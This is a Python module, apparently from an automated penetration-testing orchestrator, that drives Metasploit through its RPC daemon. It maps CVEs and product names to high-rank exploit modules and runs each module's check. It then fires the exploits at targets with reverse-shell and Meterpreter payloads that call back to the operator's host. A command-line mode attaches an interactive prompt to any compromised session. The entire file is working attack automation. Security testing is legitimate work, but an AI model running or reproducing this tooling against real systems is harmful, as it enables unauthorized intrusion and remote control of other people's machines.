"""
msf.py - all Metasploit interaction over msfrpcd.

Owns CVE-to-module search, the Great/Excellent rank filter, the DoS exclusion,
console-driven check, and the fire path (payload selection, LHOST/LPORT, execute,
session attribution by exploit uuid). Concurrency-safe: pymetasploit3 issues one
requests.post per RPC call, checks use an isolated console each, and LPORTs come
from a bounded thread-safe pool. Stopping the handler job after a session lands
frees the listener without killing the session, so LPORTs are safe to reuse.

Connection config comes from the environment (MSF_RPC_HOST, MSF_RPC_PORT,
MSF_RPC_PASS, MSF_RPC_SSL, MSF_RPC_USER) with optional overrides. msfrpcd serves
SSL by default, so ssl defaults to True here even though the library default is
False.
"""

from __future__ import annotations

import logging
import os
import queue
import re
import socket
import sys
import threading
import time
from dataclasses import dataclass

from state import Candidate, Session, Verdict, verdict_from_msf

logger = logging.getLogger(__name__)

_ANSI = re.compile(r"\x1b\[[0-9;]*m")

# MSF numeric rank constants and their names.
_RANK_NAMES = {
    0: "manual", 100: "low", 200: "average", 300: "normal",
    400: "good", 500: "great", 600: "excellent",
}
_RANK_VALUES = {v: k for k, v in _RANK_NAMES.items()}

# Public name->value map for callers tuning the rank floor (e.g. --min-rank).
RANK_VALUES = dict(_RANK_VALUES)

# nmap service names that carry no real version and are not worth searching:
# tcpwrapped means the handshake completed but the service closed before any
# banner, unknown/empty means no identification.
_NON_ACTIONABLE_SERVICES = frozenset({"", "tcpwrapped", "unknown"})

# Generic service/product tokens too broad to search Metasploit by name: a bare
# search floods candidates, and the CVE path already covers these. Product-name
# search is skipped when the most specific token is one of these.
_GENERIC_PRODUCT_TOKENS = frozenset({
    "http", "https", "www", "html", "ssl", "tls", "ssh", "smtp", "smtps",
    "imap", "imaps", "pop3", "pop3s", "dns", "domain", "tcp", "udp", "ftp",
    "ftps", "telnet", "ident", "ntp", "snmp", "rpc", "rpcbind", "msrpc",
    "netbios", "microsoft", "generic", "unknown", "service", "server",
    "daemon", "linux", "unix", "windows",
})


def _product_search_term(service):
    """Most specific lowercase alphanumeric token (>=4 chars) from the service
    product (preferred) or name, to search Metasploit by. Returns "" when nothing
    specific enough is available (e.g. only generic tokens like http)."""
    source = service.product or service.name or ""
    toks = [t for t in re.findall(r"[a-z0-9]+", source.lower())
            if len(t) >= 4 and t not in _GENERIC_PRODUCT_TOKENS]
    return max(toks, key=len) if toks else ""


def _product_relevant(term, fullname):
    """True if the module path plausibly matches the product term. Both sides are
    compared with non-alphanumerics stripped, so a concatenated product token
    (unrealircd, from nmap's product field) matches a module path that splits the
    same words (unreal_ircd_3281_backdoor), while the daemon-stripped form still
    matches (distccd -> distcc_exec)."""
    fn = re.sub(r"[^a-z0-9]", "", (fullname or "").lower())
    t = re.sub(r"[^a-z0-9]", "", (term or "").lower())
    if not t:
        return False
    if t in fn:
        return True
    return t.endswith("d") and len(t) > 4 and t[:-1] in fn

_MODULE_TYPES = ("exploit", "auxiliary", "post", "payload", "encoder", "nop", "evasion")

_PLATFORMS = (
    "windows", "linux", "unix", "osx", "android", "apple_ios", "solaris",
    "bsd", "aix", "java", "php", "python", "ruby", "nodejs", "multi",
    "firefox", "mainframe", "netware",
)


class MsfUnavailable(Exception):
    pass


@dataclass
class MsfConfig:
    host: str = "127.0.0.1"
    port: int = 55553
    password: str = ""
    ssl: bool = True
    username: str = "msf"
    check_timeout: int = 60
    exploit_timeout: int = 90
    candidates_per_service: int = 5
    rank_floor: int = 400           # Good and up
    product_search: bool = True     # also search msf by product/service name
    lport_base: int = 4444
    lport_count: int = 32
    lhost: str = ""                 # optional pin; empty means derive per target

    @classmethod
    def from_env(cls, **overrides):
        cfg = cls(
            host=os.environ.get("MSF_RPC_HOST", "127.0.0.1"),
            port=int(os.environ.get("MSF_RPC_PORT", "55553")),
            password=os.environ.get("MSF_RPC_PASS", ""),
            ssl=os.environ.get("MSF_RPC_SSL", "1") not in ("0", "false", "False", "no"),
            username=os.environ.get("MSF_RPC_USER", "msf"),
        )
        for k, v in overrides.items():
            if v is not None and hasattr(cfg, k):
                setattr(cfg, k, v)
        return cfg


class MsfClient:
    def __init__(self, cfg: MsfConfig, on_activity=None):
        self.cfg = cfg
        self._on_activity = on_activity
        self._client = None
        self._lport_pool: queue.Queue = queue.Queue()
        for p in range(cfg.lport_base, cfg.lport_base + cfg.lport_count):
            self._lport_pool.put(p)
        # Modules found to have no check method, remembered for the run so the
        # same module is never re-probed across hosts and ports.
        self._no_check: set[str] = set()
        self._no_check_lock = threading.Lock()

    def _activity(self, source, text):
        if not self._on_activity:
            return
        try:
            self._on_activity(source, text)
        except Exception:
            pass

    # -- connection --

    def connect(self):
        if not self.cfg.password:
            raise MsfUnavailable("MSF_RPC_PASS is empty; msfrpcd password required")
        try:
            from pymetasploit3.msfrpc import MsfRpcClient
        except Exception as e:
            raise MsfUnavailable(f"pymetasploit3 not installed: {e}")
        try:
            self._client = MsfRpcClient(
                self.cfg.password, server=self.cfg.host, port=self.cfg.port,
                ssl=self.cfg.ssl, username=self.cfg.username)
        except Exception as e:
            raise MsfUnavailable(
                f"cannot connect to msfrpcd at {self.cfg.host}:{self.cfg.port}: {e}")
        try:
            ver = self._client.core.version
        except Exception as e:
            raise MsfUnavailable(f"msfrpcd auth/probe failed: {e}")
        logger.info("msfrpcd connected: %s", ver)
        return self

    def close(self):
        if self._client is not None:
            try:
                self._client.logout()
            except Exception:
                pass

    # -- sessions --

    def session_list(self):
        """Live session table from msfrpcd as {id: meta_dict}. Empty on error."""
        try:
            return dict(self._client.sessions.list or {})
        except Exception as e:
            logger.warning("could not list sessions: %s", e)
            return {}

    def session_handle(self, sid):
        """Resolve a session id to (handle, type_str). (None, '') if not found.
        The handle is the pymetasploit3 session object for read/write."""
        sessions = self.session_list()
        key = next((k for k in sessions if str(k) == str(sid)), None)
        if key is None:
            return None, ""
        return (self._client.sessions.session(key),
                str(sessions[key].get("type", "")))

    def session_stop(self, sid):
        """Close a session by id. Returns True if a matching session was found and
        the stop was issued, False if no such session exists. Any RPC error from
        the stop itself propagates to the caller."""
        sessions = self.session_list()
        key = next((k for k in sessions if str(k) == str(sid)), None)
        if key is None:
            return False
        self._client.sessions.session(key).stop()
        return True

    def db_status(self):
        """Raw msfrpcd database status dict, or None if the call fails."""
        try:
            return self._client.db.status
        except Exception as e:
            logger.debug("db.status failed: %s", e)
            return None

    def db_ready(self, probe_cve="CVE-2017-0144", slow_threshold=3.0):
        """True if the postgres cache is connected. Primary signal is db.status
        reporting a connected db; fallback is a timed search, since an uncached
        search is markedly slower than a cached one."""
        st = self.db_status()
        if isinstance(st, dict) and st.get("db"):
            return True
        start = time.time()
        try:
            self._client.modules.search("cve:" + probe_cve)
        except Exception:
            return False
        return (time.time() - start) < slow_threshold

    # -- search and candidate assembly --

    def _search_cve(self, cve_id):
        try:
            res = self._client.modules.search("cve:" + cve_id)
        except Exception as e:
            logger.warning("module search failed for %s: %s", cve_id, e)
            return []
        return res or []

    def _search_term(self, term):
        """Free-text Metasploit module search by product/service name."""
        try:
            res = self._client.modules.search(term)
        except Exception as e:
            logger.warning("module search failed for '%s': %s", term, e)
            return []
        return res or []

    def _acceptable(self, entry):
        if entry.get("type") != "exploit":
            return False
        full = entry.get("fullname", "")
        if "dos" in full.split("/"):
            return False
        if _rank_value(entry.get("rank")) < self.cfg.rank_floor:
            return False
        return True

    def candidates_for_service(self, service):
        """Search every CVE on the service, filter to fireable exploit modules,
        dedup, rank-sort, and cap. Returns a list of Candidate (unchecked)."""
        if (service.name or "").strip().lower() in _NON_ACTIONABLE_SERVICES:
            return []
        label = service.product or service.name or "service"
        self._activity("msf", f"search exploits {label} :{service.port} "
                              f"({len(service.cves)} cve)")
        by_module = {}
        for cve in service.cves:
            hits = self._search_cve(cve.cve_id)
            logger.debug("search %s (%s:%s) -> %d msf module(s)",
                         cve.cve_id, label, service.port, len(hits))
            for entry in hits:
                full = entry.get("fullname", "")
                if not self._acceptable(entry):
                    logger.debug("  reject %s type=%s rank=%s",
                                 full, entry.get("type"), entry.get("rank"))
                    continue
                logger.debug("  accept %s rank=%s", full, entry.get("rank"))
                cur = by_module.get(full)
                if cur is None or cve.cvss > cur[2]:
                    by_module[full] = (entry, cve.cve_id, cve.cvss)
        # Product-name search: catches modules keyed to a service/product rather
        # than a version CVE -- e.g. distcc, and the vsftpd/UnrealIRCd/Samba
        # backdoors -- which vulners never attaches a CVE to. Filtered to
        # relevant exploit modules so a broad term does not flood candidates.
        if self.cfg.product_search:
            term = _product_search_term(service)
            if term:
                self._activity("msf", f"search product {term} :{service.port}")
                hits = self._search_term(term)
                logger.debug("search product '%s' (%s:%s) -> %d msf module(s)",
                             term, label, service.port, len(hits))
                for entry in hits:
                    full = entry.get("fullname", "")
                    if full in by_module:
                        continue
                    if not self._acceptable(entry):
                        continue
                    if not _product_relevant(term, full):
                        logger.debug("  skip irrelevant %s", full)
                        continue
                    logger.debug("  accept %s rank=%s via product '%s'",
                                 full, entry.get("rank"), term)
                    by_module[full] = (entry, "", 0.0)
        ranked = sorted(by_module.values(),
                        key=lambda t: _rank_value(t[0].get("rank")), reverse=True)
        ranked = ranked[: self.cfg.candidates_per_service]
        out = []
        for entry, cve_id, _cvss in ranked:
            out.append(Candidate(
                module=entry.get("fullname", ""), cve_id=cve_id,
                rank=_rank_name(entry.get("rank")), port=service.port, source="msf"))
        if out:
            logger.info("search %s:%s cves=%d -> %d candidate(s): %s",
                        label, service.port, len(service.cves), len(out),
                        ", ".join(c.module for c in out))
        else:
            logger.info("search %s:%s cves=%d -> 0 fireable modules "
                        "(rank floor %d)", label, service.port,
                        len(service.cves), self.cfg.rank_floor)
        return out

    # -- check (console path) --

    def check(self, candidate, rhost, port):
        """Run the module check on a fresh isolated console. Returns
        (Verdict, detail_text). A module with no check method is remembered for
        the run and short-circuited on every later host and port: check support
        is a property of the module code, not the target, and the only way MSF
        reveals it is to run check once, so we run it once and cache the answer."""
        if self._is_no_check(candidate.module):
            logger.debug("check %s @ %s:%s -> unsupported (cached, no check)",
                         candidate.module, rhost, port)
            return Verdict.UNSUPPORTED, "no check method (cached)"
        self._activity("msf", f"check {candidate.module} @ {rhost}:{port}")
        cid = None
        try:
            console = self._client.consoles.console()
            cid = console.cid
            lines = [
                f"use {candidate.module}",
                f"set RHOSTS {rhost}",
            ]
            if port:
                lines.append(f"set RPORT {int(port)}")
            lines.append("check")
            data = self._console_run(console, "\n".join(lines) + "\n",
                                     self.cfg.check_timeout)
            code = _parse_check_output(data)
            if code == "unsupported":
                self._mark_no_check(candidate.module)
            verdict = verdict_from_msf(code)
            detail = _summarize_check(data)
            logger.info("check %s @ %s:%s -> %s (%s)", candidate.module,
                        rhost, port, verdict.value, detail)
            return verdict, detail
        except Exception as e:
            logger.warning("check error %s on %s: %s", candidate.module, rhost, e)
            return Verdict.UNKNOWN, f"check error: {e}"
        finally:
            if cid is not None:
                try:
                    self._client.consoles.destroy(cid)
                except Exception:
                    pass

    def _console_run(self, console, cmd, timeout):
        try:
            console.read()  # clear buffer
        except Exception:
            pass
        console.write(cmd)
        data = ""
        start = time.time()
        while True:
            time.sleep(0.5)
            try:
                data += console.read().get("data", "")
            except Exception:
                break
            busy = False
            try:
                busy = bool(console.is_busy())
            except Exception:
                busy = False
            if not busy and data.strip():
                break
            if time.time() - start > timeout:
                break
        return data

    def _is_no_check(self, module):
        """True if this module reported no check method earlier in the run."""
        with self._no_check_lock:
            return module in self._no_check

    def _mark_no_check(self, module):
        """Remember a module has no check method so it is not re-probed."""
        with self._no_check_lock:
            self._no_check.add(module)

    # -- fire --

    def fire(self, candidate, host, rhost, port):
        """Detonate the module against rhost with a selected reverse payload.
        Returns (session, status, detail). status is one of:
          session    - a session opened
          no_session - the module fired (execute was accepted) but nothing called
                       back within the timeout. This is the only clean negative.
          blocked    - no fair attempt was made: an option we needed was unset or
                       rejected, no compatible payload, no derivable LHOST, the
                       LPORT pool was empty, or MSF refused to run the module.
          error      - an exception was raised during the attempt.
        Only no_session means the target got a real attempt and did not yield;
        every other non-session status flags a tooling gap to review, so a real
        flaw is never buried under a generic failure. detail carries the reason.
        The handler job is always stopped in teardown, which frees the LPORT and
        leaves any session intact."""
        lport = self._lport_acquire()
        if lport is None:
            return self._blocked(candidate, rhost, "LPORT pool exhausted")
        job_id = None
        try:
            modref = _strip_type(candidate.module)
            exploit = self._client.modules.use("exploit", modref)
            payload_name = _select_payload(exploit, candidate.module, host)
            if payload_name is None:
                return self._blocked(candidate, rhost, "no compatible payload")
            payload = self._client.modules.use("payload", payload_name)
            lhost = self.cfg.lhost or _lhost_for(rhost)
            if not lhost:
                return self._blocked(candidate, rhost, "could not derive LHOST")
            # Set everything we can derive, recording any set the module rejected
            # rather than swallowing it. RHOSTS/RHOST and RPORT go on the exploit;
            # LHOST/LPORT go on the payload and ride into the exploit on the merge
            # at execute time.
            fails = _apply_options(exploit, [("RHOSTS", rhost), ("RHOST", rhost)])
            if port:
                fails += _apply_options(exploit, [("RPORT", int(port))])
            fails += _apply_options(payload, [("LHOST", lhost),
                                              ("LPORT", int(lport))])
            # Required exploit options with no default that are still unset, minus
            # whatever the payload merge will supply. Anything outstanding is
            # module-specific (creds, a target URI with no default, and so on) we
            # will not guess. A rejected set above counts too: that value did not
            # take. Either way we cannot make a fair attempt, so block with the
            # exact reason instead of firing blind into MSF option validation.
            supplied = set(payload.runoptions)
            outstanding = [o for o in exploit.missing_required
                           if o not in supplied]
            if outstanding or fails:
                parts = []
                if outstanding:
                    parts.append("unset required: "
                                 + ", ".join(sorted(outstanding)))
                if fails:
                    parts.append("rejected: " + ", ".join(
                        f"{k}={v!r} ({why})" for k, v, why in fails))
                return self._blocked(candidate, rhost, "; ".join(parts))
            self._activity("fire", f"execute {candidate.module} "
                                   f"payload={payload_name} LHOST={lhost} "
                                   f"LPORT={lport} @ {rhost}")
            logger.info("fire %s @ %s:%s payload=%s LHOST=%s LPORT=%s",
                        candidate.module, rhost, port, payload_name, lhost, lport)
            result = exploit.execute(payload=payload)
            if not isinstance(result, dict) or not result.get("uuid"):
                err = ""
                if isinstance(result, dict):
                    err = (result.get("error_message")
                           or result.get("error_string") or "")
                # No uuid means MSF never started the module: a setup or validation
                # problem, not the target resisting. Block so it gets reviewed
                # instead of being filed as a clean miss.
                return self._blocked(candidate, rhost,
                                     err or "execute returned no uuid")
            uuid = result.get("uuid")
            job_id = result.get("job_id")
            matched = self._await_session(uuid, self.cfg.exploit_timeout)
            if matched is None:
                logger.info("fire %s @ %s -> no session", candidate.module, rhost)
                return None, "no_session", "fired, no session within timeout"
            sid, sdict = matched
            logger.info("fire %s @ %s -> SESSION %s opened", candidate.module,
                        rhost, sid)
            session = Session(
                session_id=str(sid), module=candidate.module,
                payload=payload_name,
                info=str(sdict.get("info") or sdict.get("desc") or ""))
            return session, "session", f"session {sid} ({payload_name})"
        except Exception as e:
            logger.warning("fire error %s on %s: %s", candidate.module, rhost, e)
            return None, "error", f"fire error: {e}"
        finally:
            if job_id is not None:
                try:
                    self._client.jobs.stop(str(job_id))
                except Exception:
                    pass
            self._lport_release(lport)

    def _blocked(self, candidate, rhost, detail):
        """Log a blocked fire at WARNING and return the blocked tuple. A blocked
        fire is a tooling gap, not a clean negative, so it is always loud."""
        logger.warning("fire blocked %s @ %s: %s",
                       candidate.module, rhost, detail)
        self._activity("fire", f"blocked {candidate.module}: {detail}")
        return None, "blocked", detail

    def _await_session(self, uuid, timeout):
        start = time.time()
        while time.time() - start < timeout:
            try:
                sessions = self._client.sessions.list
            except Exception:
                sessions = {}
            for sid, s in sessions.items():
                if s.get("exploit_uuid") == uuid:
                    return sid, s
            time.sleep(1.0)
        return None

    # -- LPORT pool --

    def _lport_acquire(self, timeout=30):
        try:
            return self._lport_pool.get(timeout=timeout)
        except queue.Empty:
            return None

    def _lport_release(self, port):
        if port is not None:
            self._lport_pool.put(port)


# --- module helpers (no live server required) ------------------------------

def _rank_value(rank):
    if isinstance(rank, bool):
        return 0
    if isinstance(rank, (int, float)):
        return int(rank)
    if isinstance(rank, str):
        r = rank.strip().lower()
        if r.isdigit():
            return int(r)
        return _RANK_VALUES.get(r, 0)
    return 0


def _rank_name(rank):
    if isinstance(rank, bool):
        return "unknown"
    if isinstance(rank, (int, float)):
        return _RANK_NAMES.get(int(rank), str(int(rank)))
    if isinstance(rank, str):
        r = rank.strip().lower()
        if r.isdigit():
            return _RANK_NAMES.get(int(r), r)
        return r
    return "unknown"


def _strip_type(full):
    parts = full.split("/", 1)
    if parts[0] in _MODULE_TYPES and len(parts) > 1:
        return parts[1]
    return full


def _platform_from_module(full):
    parts = full.split("/")
    if len(parts) >= 2 and parts[1] in _PLATFORMS:
        seg = parts[1]
        return None if seg == "multi" else seg
    return None


def _platform_from_host(host):
    text = f"{getattr(host, 'os_match', '')}".lower()
    if not text:
        return None
    if "windows" in text:
        return "windows"
    if "linux" in text:
        return "linux"
    if "mac os" in text or "osx" in text or "darwin" in text:
        return "osx"
    if any(x in text for x in ("unix", "bsd", "solaris", "aix")):
        return "unix"
    return None


def _is_x64(host):
    arch = f"{getattr(host, 'arch', '')}".lower()
    if arch in ("x64", "x86_64", "amd64", "64", "x86-64"):
        return True
    text = f"{getattr(host, 'os_match', '')}".lower()
    return "x64" in text or "64-bit" in text or "x86_64" in text


def _payload_prefs(platform, x64):
    prefs = []
    if platform == "windows":
        if x64:
            prefs += [
                "windows/x64/meterpreter/reverse_tcp",
                "windows/x64/meterpreter_reverse_tcp",
                "windows/x64/shell/reverse_tcp",
                "windows/x64/shell_reverse_tcp",
            ]
        prefs += [
            "windows/meterpreter/reverse_tcp",
            "windows/meterpreter_reverse_tcp",
            "windows/shell/reverse_tcp",
            "windows/shell_reverse_tcp",
        ]
    elif platform == "linux":
        if x64:
            prefs += [
                "linux/x64/meterpreter/reverse_tcp",
                "linux/x64/meterpreter_reverse_tcp",
                "linux/x64/shell/reverse_tcp",
                "linux/x64/shell_reverse_tcp",
            ]
        prefs += [
            "linux/x86/meterpreter/reverse_tcp",
            "linux/x86/meterpreter_reverse_tcp",
            "linux/x86/shell/reverse_tcp",
            "linux/x86/shell_reverse_tcp",
        ]
    elif platform == "osx":
        prefs += [
            "osx/x64/meterpreter/reverse_tcp",
            "osx/x64/shell_reverse_tcp",
        ]
    elif platform == "unix":
        prefs += [
            "cmd/unix/reverse_bash",
            "cmd/unix/reverse",
            "cmd/unix/reverse_netcat",
            "cmd/unix/reverse_python",
            "cmd/unix/reverse_perl",
        ]
    elif platform == "java":
        prefs += ["java/meterpreter/reverse_tcp", "java/jsp_shell_reverse_tcp"]
    elif platform == "php":
        prefs += ["php/meterpreter/reverse_tcp", "php/reverse_php"]
    elif platform == "python":
        prefs += ["python/meterpreter/reverse_tcp", "python/shell_reverse_tcp"]
    # generic reverse fallbacks, always last
    prefs += ["generic/shell_reverse_tcp", "cmd/unix/reverse_bash", "cmd/unix/reverse"]
    return prefs


def _select_payload(exploit, full_module, host):
    """Pick the best reverse payload from the module's compatible set, matched to
    platform/arch. Falls back to any reverse payload, then warns and takes the
    first compatible payload (likely bind) only as a last resort."""
    try:
        compat = set(exploit.payloads or [])
    except Exception as e:
        logger.warning("could not list payloads for %s: %s", full_module, e)
        compat = set()
    if not compat:
        return None
    platform = _platform_from_module(full_module) or _platform_from_host(host)
    x64 = _is_x64(host)
    for p in _payload_prefs(platform, x64):
        if p in compat:
            return p
    for p in sorted(compat):
        if "reverse" in p and "bind" not in p:
            return p
    fallback = sorted(compat)[0]
    logger.warning("no reverse payload for %s; falling back to %s",
                   full_module, fallback)
    return fallback


def _apply_options(mod, pairs):
    """Set each (key, value) the module actually declares as an option. Returns a
    list of (key, value, reason) for any set the module rejected (bad type, value
    not in enums, and so on). A rejected set is recorded and surfaced, never
    swallowed, so a flaw is never hidden behind an option that silently did not
    take. Keys the module does not declare are skipped without comment."""
    failures = []
    declared = set(mod.options)
    for key, val in pairs:
        if key not in declared:
            continue
        try:
            mod[key] = val
        except Exception as e:
            failures.append((key, val, str(e)))
    return failures


def _parse_check_output(text):
    """Map MSF check console output to a CheckCode name for verdict_from_msf.
    Order matters: unsupported and safe phrases are tested before the positive
    vulnerable phrase so 'not vulnerable' is not misread as vulnerable."""
    t = _ANSI.sub("", text or "").lower()
    if ("does not support check" in t or "check is not supported" in t
            or "no check" in t):
        return "unsupported"
    if "appears to be vulnerable" in t or "appears vulnerable" in t:
        return "appears"
    if ("is not exploitable" in t or "not vulnerable" in t
            or "does not appear to be vulnerable" in t
            or "target is not" in t):
        return "safe"
    if "is vulnerable" in t or "target is vulnerable" in t:
        return "vulnerable"
    if ("cannot reliably check" in t or "unable to" in t
            or "could not connect" in t or "connection refused" in t
            or "failed to connect" in t):
        return "unknown"
    return "unknown"


def _summarize_check(text):
    clean = _ANSI.sub("", text or "")
    keep = [ln.strip() for ln in clean.splitlines()
            if any(k in ln.lower() for k in ("vulnerable", "exploitable", "check"))]
    if keep:
        return " | ".join(keep[-3:])[:240]
    tail = clean.strip().splitlines()
    return (tail[-1] if tail else "")[:240]


def _lhost_for(target):
    """Source IP the kernel would use to reach target. UDP connect consults the
    routing table without sending packets, so this works offline."""
    fam = socket.AF_INET6 if ":" in target else socket.AF_INET
    s = socket.socket(fam, socket.SOCK_DGRAM)
    try:
        s.connect((target, 9))
        return s.getsockname()[0]
    except Exception:
        return None
    finally:
        s.close()


__all__ = ["MsfConfig", "MsfClient", "MsfUnavailable", "RANK_VALUES"]


# --- session console: python msf.py [-i ID | -k ID... | -K] ----------------
# Sessions opened during a run live inside msfrpcd, not in this process, so they
# are reachable from any RPC client while the daemon runs. This entry point lists
# them, attaches an interactive prompt to one, or closes one, several, or all,
# reusing the run's stored password.

_SESSION_CONFIG_FILE = ".orchestration_config"


def _load_rpc_password(explicit):
    if explicit:
        return explicit
    env = os.environ.get("MSF_RPC_PASS")
    if env:
        return env
    try:
        import json
        with open(_SESSION_CONFIG_FILE) as f:
            pw = json.load(f).get("msf_rpc_password", "")
        if isinstance(pw, str) and pw:
            return pw
    except (OSError, ValueError):
        pass
    return ""


def _print_sessions(sessions):
    if not sessions:
        print("no open sessions (the daemon may have been restarted, or a run "
              "with no open sessions stopped it on exit)")
        return
    print(f"{'id':<4} {'type':<12} {'peer':<22} info")
    print("-" * 60)
    for sid, meta in sessions.items():
        print(f"{str(sid):<4} {str(meta.get('type', '')):<12} "
              f"{str(meta.get('tunnel_peer', '')):<22} {meta.get('info', '')}")


def _kill_sessions(client, ids):
    """Stop each session id in turn, printing one result line per id. Returns the
    number actually closed."""
    closed = 0
    for sid in ids:
        try:
            ok = client.session_stop(sid)
        except Exception as e:
            print(f"session {sid}: error closing: {e}")
            continue
        if ok:
            print(f"session {sid}: closed")
            closed += 1
        else:
            print(f"session {sid}: not found")
    return closed


def _session_console(client, sid):
    handle, stype = client.session_handle(sid)
    if handle is None:
        print(f"session {sid} not found. open sessions:")
        _print_sessions(client.session_list())
        return
    print(f"attached to session {sid} ({stype}); 'exit' or Ctrl-D detaches "
          "(the session stays open)\n")
    try:
        handle.read()                      # drain any pending banner
    except Exception:
        pass
    while True:
        try:
            cmd = input("session> ")
        except (EOFError, KeyboardInterrupt):
            print()
            break
        if cmd.strip() in ("exit", "quit"):
            break
        if not cmd.strip():
            continue
        try:
            if stype == "meterpreter":
                sys.stdout.write(handle.run_with_output(cmd + "\n", ["\n"]))
            else:
                handle.write(cmd + "\n")
                time.sleep(0.4)
                sys.stdout.write(handle.read())
            sys.stdout.flush()
        except Exception as e:
            print(f"error: {e}")
    print("detached; session left open in msfrpcd")


def _main(argv=None):
    import argparse
    p = argparse.ArgumentParser(
        prog="msf.py",
        description="list, attach to, or close sessions in the orchestrator's "
                    "msfrpcd")
    action = p.add_mutually_exclusive_group()
    action.add_argument("-i", "--interact", metavar="ID",
                        help="attach an interactive prompt to a session id")
    action.add_argument("-k", "--kill", nargs="+", metavar="ID",
                        help="close the given session id(s)")
    action.add_argument("-K", "--kill-all", action="store_true",
                        help="close all open sessions")
    p.add_argument("-y", "--yes", action="store_true",
                   help="skip the confirmation prompt for --kill-all")
    p.add_argument("--host", default=None)
    p.add_argument("--port", type=int, default=None)
    p.add_argument("--user", default=None)
    p.add_argument("--password", default=None,
                   help=f"else MSF_RPC_PASS env, else {_SESSION_CONFIG_FILE}")
    ssl = p.add_mutually_exclusive_group()
    ssl.add_argument("--ssl", dest="ssl", action="store_true", default=None)
    ssl.add_argument("--no-ssl", dest="ssl", action="store_false")
    args = p.parse_args(argv)
    cfg = MsfConfig.from_env(
        host=args.host, port=args.port, username=args.user, ssl=args.ssl,
        password=_load_rpc_password(args.password))
    if not cfg.password:
        sys.exit("no msfrpcd password: pass --password, set MSF_RPC_PASS, or run "
                 f"from the directory holding {_SESSION_CONFIG_FILE}")
    try:
        client = MsfClient(cfg).connect()
    except MsfUnavailable as e:
        sys.exit(f"{e}\nis msfrpcd still running? check: pgrep -af msfrpcd")
    try:
        if args.kill_all:
            sessions = client.session_list()
            if not sessions:
                print("no open sessions to close")
                return
            ids = list(sessions.keys())
            if not args.yes:
                if not sys.stdin.isatty():
                    sys.exit("refusing to close all sessions non-interactively; "
                             "pass --yes")
                _print_sessions(sessions)
                resp = input(f"\nClose all {len(ids)} session(s)? [y/N] "
                             ).strip().lower()
                if resp not in ("y", "yes"):
                    sys.exit("aborted")
            n = _kill_sessions(client, ids)
            print(f"closed {n} of {len(ids)} session(s)")
        elif args.kill:
            n = _kill_sessions(client, args.kill)
            print(f"closed {n} of {len(args.kill)} session(s)")
        elif args.interact:
            _session_console(client, args.interact)
        else:
            _print_sessions(client.session_list())
    finally:
        client.close()


if __name__ == "__main__":
    _main()
